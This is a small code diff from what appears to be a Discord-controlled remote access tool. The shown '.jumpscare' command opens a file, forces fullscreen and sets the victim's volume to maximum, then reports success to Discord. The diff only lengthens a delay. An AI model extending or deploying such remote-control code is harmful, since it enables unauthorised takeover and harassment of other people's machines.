@@ -23,7 +23,7 @@ elif message.content == '.jumpscare':
 
     time.sleep(1)
     os.startfile(temp_file)
-    time.sleep(0.5)
+    time.sleep(1)
     pyautogui.press('f11')
     volume.SetMasterVolumeLevelScalar(1.0, None)
     embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
